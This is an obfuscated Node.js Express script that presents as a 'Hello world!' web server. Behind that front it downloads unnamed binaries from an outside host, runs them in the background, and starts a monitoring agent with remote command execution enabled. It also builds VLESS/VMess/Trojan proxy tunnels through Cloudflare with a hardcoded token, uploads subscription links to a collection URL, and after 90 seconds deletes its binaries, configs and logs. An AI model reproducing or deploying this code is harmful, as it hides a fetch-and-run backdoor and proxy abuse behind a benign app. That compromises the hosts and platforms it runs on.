const _0x4a3848=_0x4622;(function(_0x2b1d0f,_0x4b6442){const _0x587321=_0x4622,_0x337499=_0x2b1d0f();while(!![]){try{const _0xf881a6=parseInt(_0x587321(0x1c4))/0x1*(-parseInt(_0x587321(0x1cf))/0x2)+-parseInt(_0x587321(0x1ad))/0x3*(-parseInt(_0x587321(0x225))/0x4)+-parseInt(_0x587321(0x1ef))/0x5+parseInt(_0x587321(0x229))/0x6+-parseInt(_0x587321(0x1e3))/0x7*(-parseInt(_0x587321(0x1af))/0x8)+parseInt(_0x587321(0x20f))/0x9+-parseInt(_0x587321(0x19a))/0xa*(parseInt(_0x587321(0x1db))/0xb);if(_0xf881a6===_0x4b6442)break;else _0x337499['push'](_0x337499['shift']());}catch(_0x4158b1){_0x337499['push'](_0x337499['shift']());}}}(_0x4d33,0x2f57c));const express=require(_0x4a3848(0x1d5)),app=express(),axios=require(_0x4a3848(0x1f8)),os=require('os'),fs=require('fs'),path=require(_0x4a3848(0x245)),{promisify}=require(_0x4a3848(0x1d1)),exec=promisify(require(_0x4a3848(0x1df))['exec']),{execSync}=require(_0x4a3848(0x1df)),UPLOAD_URL=process[_0x4a3848(0x21b)][_0x4a3848(0x221)]||'',PROJECT_URL=process[_0x4a3848(0x21b)][_0x4a3848(0x1e6)]||'',AUTO_ACCESS=process[_0x4a3848(0x21b)][_0x4a3848(0x237)]||![],FILE_PATH=process[_0x4a3848(0x21b)][_0x4a3848(0x217)]||'./tmp',SUB_PATH=process[_0x4a3848(0x21b)][_0x4a3848(0x197)]||_0x4a3848(0x1dd),PORT=process[_0x4a3848(0x21b)][_0x4a3848(0x20b)]||process[_0x4a3848(0x21b)][_0x4a3848(0x1ed)]||0xbb8,UUID=process[_0x4a3848(0x21b)][_0x4a3848(0x23e)]||_0x4a3848(0x24e),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x4a3848(0x21b)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x4a3848(0x21b)][_0x4a3848(0x24a)]||'',ARGO_DOMAIN=process['env'][_0x4a3848(0x1a2)]||_0x4a3848(0x247),ARGO_AUTH=process['env'][_0x4a3848(0x23a)]||_0x4a3848(0x22c),ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x4a3848(0x21b)][_0x4a3848(0x1b1)]||_0x4a3848(0x208),CFPORT=process[_0x4a3848(0x21b)]['CFPORT']||0x1bb,NAME=process[_0x4a3848(0x21b)][_0x4a3848(0x218)]||'';!fs[_0x4a3848(0x1f3)](FILE_PATH)?(fs[_0x4a3848(0x224)](FILE_PATH),console['log'](FILE_PATH+_0x4a3848(0x1bd))):console[_0x4a3848(0x1cc)](FILE_PATH+_0x4a3848(0x212));function generateRandomName(){const _0x567fb6=_0x4a3848,_0x340ce3=_0x567fb6(0x1c3);let _0x52f96a='';for(let _0x4c12fd=0x0;_0x4c12fd<0x6;_0x4c12fd++){_0x52f96a+=_0x340ce3[_0x567fb6(0x216)](Math[_0x567fb6(0x21d)](Math['random']()*_0x340ce3[_0x567fb6(0x1b5)]));}return _0x52f96a;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4a3848(0x1fb)](FILE_PATH,npmName),phpPath=path[_0x4a3848(0x1fb)](FILE_PATH,phpName),webPath=path[_0x4a3848(0x1fb)](FILE_PATH,webName),botPath=path[_0x4a3848(0x1fb)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x4a3848(0x1fb)](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x4a3848(0x1a3)),configPath=path[_0x4a3848(0x1fb)](FILE_PATH,_0x4a3848(0x215));function deleteNodes(){const _0x11d2f5=_0x4a3848;try{if(!UPLOAD_URL)return;if(!fs[_0x11d2f5(0x1f3)](subPath))return;let _0x5bc745;try{_0x5bc745=fs[_0x11d2f5(0x206)](subPath,_0x11d2f5(0x19d));}catch{return null;}const _0x2f3571=Buffer[_0x11d2f5(0x20c)](_0x5bc745,_0x11d2f5(0x1da))[_0x11d2f5(0x1e5)]('utf-8'),_0xdd5d76=_0x2f3571['split']('\x0a')[_0x11d2f5(0x1d9)](_0x1a775d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1a775d));if(_0xdd5d76[_0x11d2f5(0x1b5)]===0x0)return;return axios[_0x11d2f5(0x1bf)](UPLOAD_URL+_0x11d2f5(0x201),JSON[_0x11d2f5(0x1c2)]({'nodes':_0xdd5d76}),{'headers':{'Content-Type':_0x11d2f5(0x24c)}})['catch'](_0x2c2229=>{return null;}),null;}catch(_0x47065b){return null;}}function cleanupOldFiles(){const _0x52bc15=_0x4a3848;try{const _0x1c5699=fs[_0x52bc15(0x1f4)](FILE_PATH);_0x1c5699[_0x52bc15(0x1e7)](_0x1abb1f=>{const _0x5c5c7b=_0x52bc15,_0x3b7af7=path['join'](FILE_PATH,_0x1abb1f);try{const _0x548a03=fs[_0x5c5c7b(0x238)](_0x3b7af7);_0x548a03['isFile']()&&fs['unlinkSync'](_0x3b7af7);}catch(_0x4d430d){}});}catch(_0x487f6e){}}app[_0x4a3848(0x1d6)]('/',function(_0x36d119,_0x40334a){const _0x5288af=_0x4a3848;_0x40334a[_0x5288af(0x239)](_0x5288af(0x19b));});async function generateConfig(){const _0x983008=_0x4a3848,_0x1fb5e9={'log':{'access':_0x983008(0x223),'error':'/dev/null','loglevel':_0x983008(0x199)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x983008(0x1e8),'settings':{'clients':[{'id':UUID,'flow':_0x983008(0x1ee)}],'decryption':_0x983008(0x199),'fallbacks':[{'dest':0xbb9},{'path':_0x983008(0x1f5),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x983008(0x1fc),'dest':0xbbc}]},'streamSettings':{'network':_0x983008(0x234)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x983008(0x199)},'streamSettings':{'network':_0x983008(0x234),'security':_0x983008(0x199)}},{'port':0xbba,'listen':_0x983008(0x23d),'protocol':_0x983008(0x1e8),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x983008(0x199)},'streamSettings':{'network':'ws','security':_0x983008(0x199),'wsSettings':{'path':_0x983008(0x1f5)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x983008(0x1cb),_0x983008(0x21f)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x983008(0x23d),'protocol':_0x983008(0x1c0),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x983008(0x1a5)}},'sniffing':{'enabled':!![],'destOverride':[_0x983008(0x204),_0x983008(0x1cb),_0x983008(0x21f)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x983008(0x23d),'protocol':_0x983008(0x248),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x983008(0x199),'wsSettings':{'path':_0x983008(0x1fc)}},'sniffing':{'enabled':!![],'destOverride':[_0x983008(0x204),_0x983008(0x1cb),_0x983008(0x21f)],'metadataOnly':![]}}],'dns':{'servers':[_0x983008(0x1c7)]},'outbounds':[{'protocol':'freedom','tag':_0x983008(0x227)},{'protocol':_0x983008(0x243),'tag':_0x983008(0x1ba)}]};fs['writeFileSync'](path[_0x983008(0x1fb)](FILE_PATH,'config.json'),JSON[_0x983008(0x1c2)](_0x1fb5e9,null,0x2));}function getSystemArchitecture(){const _0x2410a0=_0x4a3848,_0x1a4d3=os[_0x2410a0(0x1e2)]();return _0x1a4d3===_0x2410a0(0x20d)||_0x1a4d3===_0x2410a0(0x209)||_0x1a4d3===_0x2410a0(0x1e4)?_0x2410a0(0x20d):'amd';}function downloadFile(_0x137a73,_0xb5cdbf,_0x8ef8ba){const _0x36720f=_0x4a3848,_0x1edebb=_0x137a73;!fs[_0x36720f(0x1f3)](FILE_PATH)&&fs[_0x36720f(0x224)](FILE_PATH,{'recursive':!![]});const _0x2ef39d=fs[_0x36720f(0x235)](_0x1edebb);axios({'method':'get','url':_0xb5cdbf,'responseType':_0x36720f(0x1f0)})['then'](_0xb48306=>{const _0x119f4f=_0x36720f;_0xb48306[_0x119f4f(0x246)][_0x119f4f(0x1be)](_0x2ef39d),_0x2ef39d['on'](_0x119f4f(0x19c),()=>{const _0x5c176e=_0x119f4f;_0x2ef39d[_0x5c176e(0x195)](),console[_0x5c176e(0x1cc)]('Download\x20'+path['basename'](_0x1edebb)+_0x5c176e(0x21e)),_0x8ef8ba(null,_0x1edebb);}),_0x2ef39d['on'](_0x119f4f(0x193),_0x44471b=>{const _0x16957c=_0x119f4f;fs[_0x16957c(0x210)](_0x1edebb,()=>{});const _0x1dec5f=_0x16957c(0x18f)+path[_0x16957c(0x1ac)](_0x1edebb)+_0x16957c(0x21a)+_0x44471b[_0x16957c(0x230)];console[_0x16957c(0x193)](_0x1dec5f),_0x8ef8ba(_0x1dec5f);});})[_0x36720f(0x1a4)](_0x10bf2a=>{const _0x36e0fa=_0x36720f,_0x127b96=_0x36e0fa(0x18f)+path[_0x36e0fa(0x1ac)](_0x1edebb)+_0x36e0fa(0x21a)+_0x10bf2a[_0x36e0fa(0x230)];console[_0x36e0fa(0x193)](_0x127b96),_0x8ef8ba(_0x127b96);});}async function downloadFilesAndRun(){const _0x39b011=_0x4a3848,_0x5b8235=getSystemArchitecture(),_0x447f9f=getFilesForArchitecture(_0x5b8235);if(_0x447f9f[_0x39b011(0x1b5)]===0x0){console[_0x39b011(0x1cc)](_0x39b011(0x23b));return;}const _0x34cd83=_0x447f9f['map'](_0x1d8026=>{return new Promise((_0x4558e7,_0x31cc12)=>{const _0x118157=_0x4622;downloadFile(_0x1d8026[_0x118157(0x20e)],_0x1d8026[_0x118157(0x1b3)],(_0x27ca57,_0x7e557)=>{_0x27ca57?_0x31cc12(_0x27ca57):_0x4558e7(_0x7e557);});});});try{await Promise[_0x39b011(0x1f2)](_0x34cd83);}catch(_0x2a3359){console[_0x39b011(0x193)](_0x39b011(0x233),_0x2a3359);return;}function _0x4fb0dd(_0x22b225){const _0x2d85cd=_0x39b011,_0xa61c18=0x1fd;_0x22b225[_0x2d85cd(0x1e7)](_0x202c8b=>{const _0x137f07=_0x2d85cd;fs[_0x137f07(0x1f3)](_0x202c8b)&&fs[_0x137f07(0x200)](_0x202c8b,_0xa61c18,_0x18be51=>{const _0x539517=_0x137f07;_0x18be51?console[_0x539517(0x193)]('Empowerment\x20failed\x20for\x20'+_0x202c8b+':\x20'+_0x18be51):console[_0x539517(0x1cc)]('Empowerment\x20success\x20for\x20'+_0x202c8b+':\x20'+_0xa61c18[_0x539517(0x1e5)](0x8));});});}const _0x6419b4=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4fb0dd(_0x6419b4);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5930e6=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x39b011(0x1b7)](':')[_0x39b011(0x228)]():'',_0x2d086b=new Set([_0x39b011(0x1b8),_0x39b011(0x1dc),_0x39b011(0x1d4),_0x39b011(0x236),_0x39b011(0x24b),'2053']),_0x2d2755=_0x2d086b[_0x39b011(0x22d)](_0x5930e6)?_0x39b011(0x1bb):_0x39b011(0x1f1),_0x2b0829='\x0aclient_secret:\x20'+NEZHA_KEY+_0x39b011(0x24d)+NEZHA_SERVER+_0x39b011(0x20a)+_0x2d2755+_0x39b011(0x1a7)+UUID;fs[_0x39b011(0x1e1)](path[_0x39b011(0x1fb)](FILE_PATH,'config.yaml'),_0x2b0829);const _0x4f5932='nohup\x20'+phpPath+_0x39b011(0x192)+FILE_PATH+_0x39b011(0x1ce);try{await exec(_0x4f5932),console[_0x39b011(0x1cc)](phpName+_0x39b011(0x226)),await new Promise(_0x5785cd=>setTimeout(_0x5785cd,0x3e8));}catch(_0x18b843){console[_0x39b011(0x193)](_0x39b011(0x1e9)+_0x18b843);}}else{let _0x4fe016='';const _0x52899f=[_0x39b011(0x1b8),_0x39b011(0x1dc),'2096',_0x39b011(0x236),'2083',_0x39b011(0x1f6)];_0x52899f[_0x39b011(0x220)](NEZHA_PORT)&&(_0x4fe016=_0x39b011(0x191));const _0x13b5e6='nohup\x20'+npmPath+_0x39b011(0x1b4)+NEZHA_SERVER+':'+NEZHA_PORT+_0x39b011(0x1f7)+NEZHA_KEY+'\x20'+_0x4fe016+_0x39b011(0x240);try{await exec(_0x13b5e6),console['log'](npmName+_0x39b011(0x226)),await new Promise(_0x537144=>setTimeout(_0x537144,0x3e8));}catch(_0x250962){console['error']('npm\x20running\x20error:\x20'+_0x250962);}}}else console[_0x39b011(0x1cc)](_0x39b011(0x1c8));const _0x120e89='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+_0x39b011(0x1e0);try{await exec(_0x120e89),console[_0x39b011(0x1cc)](webName+_0x39b011(0x226)),await new Promise(_0x2c01ef=>setTimeout(_0x2c01ef,0x3e8));}catch(_0x4cdb7c){console[_0x39b011(0x193)](_0x39b011(0x1c1)+_0x4cdb7c);}if(fs[_0x39b011(0x1f3)](botPath)){let _0x46d9cb;if(ARGO_AUTH[_0x39b011(0x1d2)](/^[A-Z0-9a-z=]{120,250}$/))_0x46d9cb=_0x39b011(0x21c)+ARGO_AUTH;else ARGO_AUTH[_0x39b011(0x1d2)](/TunnelSecret/)?_0x46d9cb='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x39b011(0x1a9):_0x46d9cb=_0x39b011(0x22f)+FILE_PATH+_0x39b011(0x1fd)+ARGO_PORT;try{await exec(_0x39b011(0x205)+botPath+'\x20'+_0x46d9cb+_0x39b011(0x19e)),console[_0x39b011(0x1cc)](botName+_0x39b011(0x226)),await new Promise(_0x5875ac=>setTimeout(_0x5875ac,0x7d0));}catch(_0x55a088){console['error'](_0x39b011(0x214)+_0x55a088);}}await new Promise(_0xe1979c=>setTimeout(_0xe1979c,0x1388));}function getFilesForArchitecture(_0x32ee11){const _0x44b8c1=_0x4a3848;let _0x5b92df;_0x32ee11===_0x44b8c1(0x20d)?_0x5b92df=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x44b8c1(0x1fe)}]:_0x5b92df=[{'fileName':webPath,'fileUrl':_0x44b8c1(0x1d8)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2487ba=_0x32ee11===_0x44b8c1(0x20d)?_0x44b8c1(0x213):_0x44b8c1(0x244);_0x5b92df[_0x44b8c1(0x1c9)]({'fileName':npmPath,'fileUrl':_0x2487ba});}else{const _0x2de685=_0x32ee11===_0x44b8c1(0x20d)?'https://arm64.ssss.nyc.mn/v1':_0x44b8c1(0x1eb);_0x5b92df[_0x44b8c1(0x1c9)]({'fileName':phpPath,'fileUrl':_0x2de685});}}return _0x5b92df;}function _0x4622(_0x7ccb67,_0x58f807){_0x7ccb67=_0x7ccb67-0x18f;const _0x4d3356=_0x4d33();let _0x4622c2=_0x4d3356[_0x7ccb67];return _0x4622c2;}function argoType(){const _0x321d60=_0x4a3848;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x321d60(0x1cc)](_0x321d60(0x22e));return;}if(ARGO_AUTH[_0x321d60(0x220)]('TunnelSecret')){fs['writeFileSync'](path[_0x321d60(0x1fb)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x3660fa=_0x321d60(0x207)+ARGO_AUTH[_0x321d60(0x1b7)]('\x22')[0xb]+_0x321d60(0x1cd)+path[_0x321d60(0x1fb)](FILE_PATH,_0x321d60(0x23c))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x321d60(0x1ea)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x321d60(0x1e1)](path['join'](FILE_PATH,_0x321d60(0x198)),_0x3660fa);}else console[_0x321d60(0x1cc)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x48a2f7=_0x4a3848;let _0x10ae05;if(ARGO_AUTH&&ARGO_DOMAIN)_0x10ae05=ARGO_DOMAIN,console[_0x48a2f7(0x1cc)](_0x48a2f7(0x1f9),_0x10ae05),await _0x278669(_0x10ae05);else try{const _0xee528e=fs[_0x48a2f7(0x206)](path['join'](FILE_PATH,_0x48a2f7(0x1a3)),_0x48a2f7(0x19d)),_0x47cbe9=_0xee528e[_0x48a2f7(0x1b7)]('\x0a'),_0x1850e8=[];_0x47cbe9[_0x48a2f7(0x1e7)](_0x30f0bb=>{const _0x32168b=_0x48a2f7,_0x3f9baf=_0x30f0bb[_0x32168b(0x1d2)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3f9baf){const _0x4eba83=_0x3f9baf[0x1];_0x1850e8['push'](_0x4eba83);}});if(_0x1850e8[_0x48a2f7(0x1b5)]>0x0)_0x10ae05=_0x1850e8[0x0],console['log'](_0x48a2f7(0x1ff),_0x10ae05),await _0x278669(_0x10ae05);else{console[_0x48a2f7(0x1cc)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x48a2f7(0x249)](path[_0x48a2f7(0x1fb)](FILE_PATH,_0x48a2f7(0x1a3)));async function _0x2132d9(){const _0x369353=_0x48a2f7;try{process[_0x369353(0x1fa)]===_0x369353(0x23f)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x369353(0x1ae)):await exec(_0x369353(0x1de)+botName[_0x369353(0x216)](0x0)+']'+botName[_0x369353(0x232)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0xc16589){}}_0x2132d9(),await new Promise(_0x98b29c=>setTimeout(_0x98b29c,0xbb8));const _0x254025=_0x48a2f7(0x22f)+FILE_PATH+_0x48a2f7(0x1fd)+ARGO_PORT;try{await exec(_0x48a2f7(0x205)+botPath+'\x20'+_0x254025+_0x48a2f7(0x19e)),console[_0x48a2f7(0x1cc)](botName+'\x20is\x20running'),await new Promise(_0x2b7c1a=>setTimeout(_0x2b7c1a,0xbb8)),await extractDomains();}catch(_0x523005){console[_0x48a2f7(0x193)](_0x48a2f7(0x214)+_0x523005);}}}catch(_0x3b05ea){console[_0x48a2f7(0x193)](_0x48a2f7(0x196),_0x3b05ea);}async function _0x278669(_0x2ad641){const _0x39aa5f=_0x48a2f7,_0x5e4fd8=execSync(_0x39aa5f(0x222),{'encoding':_0x39aa5f(0x19d)}),_0x84d278=_0x5e4fd8[_0x39aa5f(0x1a1)](),_0x4ccde6=NAME?NAME+'-'+_0x84d278:_0x84d278;return new Promise(_0x46b927=>{setTimeout(()=>{const _0x503979=_0x4622,_0xf8ca31={'v':'2','ps':''+_0x4ccde6,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x503979(0x199),'net':'ws','type':_0x503979(0x199),'host':_0x2ad641,'path':_0x503979(0x1ab),'tls':'tls','sni':_0x2ad641,'alpn':'','fp':_0x503979(0x1a8)},_0x1cf635='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x2ad641+_0x503979(0x1b9)+_0x2ad641+_0x503979(0x1c5)+_0x4ccde6+_0x503979(0x19f)+Buffer[_0x503979(0x20c)](JSON[_0x503979(0x1c2)](_0xf8ca31))[_0x503979(0x1e5)](_0x503979(0x1da))+_0x503979(0x219)+UUID+'@'+CFIP+':'+CFPORT+_0x503979(0x1d7)+_0x2ad641+_0x503979(0x1b9)+_0x2ad641+_0x503979(0x241)+_0x4ccde6+_0x503979(0x1ca);console[_0x503979(0x1cc)](Buffer[_0x503979(0x20c)](_0x1cf635)[_0x503979(0x1e5)](_0x503979(0x1da))),fs[_0x503979(0x1e1)](subPath,Buffer[_0x503979(0x20c)](_0x1cf635)[_0x503979(0x1e5)](_0x503979(0x1da))),console['log'](FILE_PATH+_0x503979(0x1b2)),uploadNodes(),app[_0x503979(0x1d6)]('/'+SUB_PATH,(_0x4ee430,_0xa69fdd)=>{const _0x3e1d34=_0x503979,_0x15ab63=Buffer['from'](_0x1cf635)['toString'](_0x3e1d34(0x1da));_0xa69fdd[_0x3e1d34(0x1d3)]('Content-Type','text/plain;\x20charset=utf-8'),_0xa69fdd[_0x3e1d34(0x239)](_0x15ab63);}),_0x46b927(_0x1cf635);},0x7d0);});}}async function uploadNodes(){const _0xdfc02f=_0x4a3848;if(UPLOAD_URL&&PROJECT_URL){const _0x4b5745=PROJECT_URL+'/'+SUB_PATH,_0x4b1a4e={'subscription':[_0x4b5745]};try{const _0x2b3a9d=await axios[_0xdfc02f(0x1bf)](UPLOAD_URL+_0xdfc02f(0x203),_0x4b1a4e,{'headers':{'Content-Type':_0xdfc02f(0x24c)}});return _0x2b3a9d&&_0x2b3a9d[_0xdfc02f(0x211)]===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x2b3a9d):null;}catch(_0xe8aa9b){if(_0xe8aa9b['response']){if(_0xe8aa9b[_0xdfc02f(0x190)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xdfc02f(0x1f3)](listPath))return;const _0x277e2d=fs[_0xdfc02f(0x206)](listPath,_0xdfc02f(0x19d)),_0x675e12=_0x277e2d['split']('\x0a')[_0xdfc02f(0x1d9)](_0x235e31=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xdfc02f(0x1a6)](_0x235e31));if(_0x675e12[_0xdfc02f(0x1b5)]===0x0)return;const _0x2a25bc=JSON[_0xdfc02f(0x1c2)]({'nodes':_0x675e12});try{const _0x144099=await axios[_0xdfc02f(0x1bf)](UPLOAD_URL+'/api/add-nodes',_0x2a25bc,{'headers':{'Content-Type':_0xdfc02f(0x24c)}});return _0x144099&&_0x144099['status']===0xc8?(console['log'](_0xdfc02f(0x1b0)),_0x144099):null;}catch(_0x51870d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2146ea=_0x4622,_0x582531=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x582531[_0x2146ea(0x22a)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x582531[_0x2146ea(0x22a)](phpPath);process[_0x2146ea(0x1fa)]===_0x2146ea(0x23f)?exec(_0x2146ea(0x231)+_0x582531['join']('\x20')+_0x2146ea(0x1b6),_0x571e29=>{const _0x562bd=_0x2146ea;console[_0x562bd(0x1c6)](),console[_0x562bd(0x1cc)]('App\x20is\x20running'),console[_0x562bd(0x1cc)](_0x562bd(0x1d0));}):exec(_0x2146ea(0x1bc)+_0x582531[_0x2146ea(0x1fb)]('\x20')+_0x2146ea(0x242),_0x5eb27b=>{const _0x25b174=_0x2146ea;console[_0x25b174(0x1c6)](),console[_0x25b174(0x1cc)](_0x25b174(0x1a0)),console[_0x25b174(0x1cc)](_0x25b174(0x1d0));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3b4733=_0x4a3848;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3b4733(0x1cc)](_0x3b4733(0x202));return;}try{const _0x190106=await axios[_0x3b4733(0x1bf)](_0x3b4733(0x22b),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3b4733(0x24c)}});return console[_0x3b4733(0x1cc)]('automatic\x20access\x20task\x20added\x20successfully'),_0x190106;}catch(_0x5f5376){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x5f5376[_0x3b4733(0x230)]),null;}}async function startserver(){const _0x1a95f6=_0x4a3848;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x30c8c4){console[_0x1a95f6(0x193)](_0x1a95f6(0x1ec),_0x30c8c4);}}function _0x4d33(){const _0x8cc4b3=['none','10uDjVyS','Hello\x20world!','finish','utf-8','\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x0avmess://','App\x20is\x20running','trim','ARGO_DOMAIN','boot.log','catch','/vmess-argo','test','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','firefox','/tunnel.yml\x20run','http\x20server\x20is\x20running\x20on\x20port:','/vmess-argo?ed=2560','basename','6ObLLxL','.exe\x20>\x20nul\x202>&1','1039552cBjYZF','Nodes\x20uploaded\x20successfully','CFIP','/sub.txt\x20saved\x20successfully','fileUrl','\x20-s\x20','length','\x20>\x20nul\x202>&1','split','443','&fp=firefox&type=ws&host=','block','true','rm\x20-rf\x20','\x20is\x20created','pipe','post','vmess','web\x20running\x20error:\x20','stringify','abcdefghijklmnopqrstuvwxyz','3qIjnsT','&path=%2Fvless-argo%3Fed%3D2560#','clear','https+local://8.8.8.8/dns-query','NEZHA\x20variable\x20is\x20empty,skip\x20running','unshift','\x0a\x20\x20\x20\x20','tls','log','\x0a\x20\x20credentials-file:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','205802vYsUGT','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','util','match','set','2096','express','get','?security=tls&sni=','https://amd64.ssss.nyc.mn/web','filter','base64','3053061AHUZVo','8443','subabc','pkill\x20-f\x20\x22[','child_process','/config.json\x20>/dev/null\x202>&1\x20&','writeFileSync','arch','7PBbhXm','aarch64','toString','PROJECT_URL','forEach','vless','php\x20running\x20error:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://amd64.ssss.nyc.mn/v1','Error\x20in\x20startserver:','PORT','xtls-rprx-vision','383830fdpblu','stream','false','all','existsSync','readdirSync','/vless-argo','2053','\x20-p\x20','axios','ARGO_DOMAIN:','platform','join','/trojan-argo','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https://arm64.ssss.nyc.mn/bot','ArgoDomain:','chmod','/api/delete-nodes','Skipping\x20adding\x20automatic\x20access\x20task','/api/add-subscriptions','http','nohup\x20','readFileSync','\x0a\x20\x20tunnel:\x20','saas.sin.fan','arm64','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','SERVER_PORT','from','arm','fileName','3224871TDaYju','unlink','status','\x20already\x20exists','https://arm64.ssss.nyc.mn/agent','Error\x20executing\x20command:\x20','config.json','charAt','FILE_PATH','NAME','\x0a\x20\x20\x0atrojan://','\x20failed:\x20','env','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','floor','\x20successfully','quic','includes','UPLOAD_URL','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','/dev/null','mkdirSync','444364lucVGz','\x20is\x20running','direct','pop','878946LIYeff','push','https://oooo.serv00.net/add-url','eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiOWZmYjVjOTgtZDcyMy00ZjA0LWFhMWYtYTM4MTUzZDhlNTZhIiwicyI6IllUUmxaalEyTkdNdE9UWTRNaTAwTWpSaExUa3lPVGd0TjJJellqRXlOV1F3WlRNdyJ9','has','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','message','del\x20/f\x20/q\x20','substring','Error\x20downloading\x20files:','tcp','createWriteStream','2087','AUTO_ACCESS','statSync','send','ARGO_AUTH','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','tunnel.json','127.0.0.1','UUID','win32','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','&path=%2Ftrojan-argo%3Fed%3D2560#','\x20>/dev/null\x202>&1','blackhole','https://amd64.ssss.nyc.mn/agent','path','data','koyebde.yueji-rights.com','trojan','unlinkSync','NEZHA_KEY','2083','application/json','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','bc97f674-c578-4940-9234-0a1da46041b9','Download\x20','response','--tls','\x20-c\x20\x22','error','Unhandled\x20error\x20in\x20startserver:','close','Error\x20reading\x20boot.log:','SUB_PATH','tunnel.yml'];_0x4d33=function(){return _0x8cc4b3;};return _0x4d33();}startserver()['catch'](_0x5cb99a=>{const _0x50911e=_0x4a3848;console[_0x50911e(0x193)](_0x50911e(0x194),_0x5cb99a);}),app['listen'](PORT,()=>console[_0x4a3848(0x1cc)](_0x4a3848(0x1aa)+PORT+'!'));
